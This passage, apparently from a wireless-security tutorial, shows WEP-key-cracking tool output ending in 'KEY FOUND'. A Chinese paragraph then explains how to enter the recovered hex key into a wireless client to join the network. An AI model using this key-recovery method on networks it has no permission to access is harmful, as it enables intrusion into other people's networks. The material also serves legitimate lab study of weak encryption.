  0    0/  9   12(  15) F9(  15) 47(  12) F7(  12) FE(  12) 1B(   5) 77(   5) A5(   3) F6(   3) 03(   0)  
  1    0/  8   34(  61) E8(  27) E0(  24) 06(  18) 3B(  16) 4E(  15) E1(  15) 2D(  13) 89(  12) E4(  12)  
  2    0/  2   56(  87) A6(  63) 15(  17) 02(  15) 6B(  15) E0(  15) AB(  13) 0E(  10) 17(  10) 27(  10)  
  3    1/  5   78(  43) 1A(  20) 9B(  20) 4B(  17) 4A(  16) 2B(  15) 4D(  15) 58(  15) 6A(  15) 7C(  15)  

                       KEY FOUND! [ 12:34:56:78:90 ]  
      Probability: 100% 
```

请注意，密钥的显示方式并非您所期望的那样。方括号中的字符是十六进制的通行密钥。如果您删除冒号，然后在提示要与网络关联时将剩余字符粘贴到无线客户端中，它仍然可以工作。
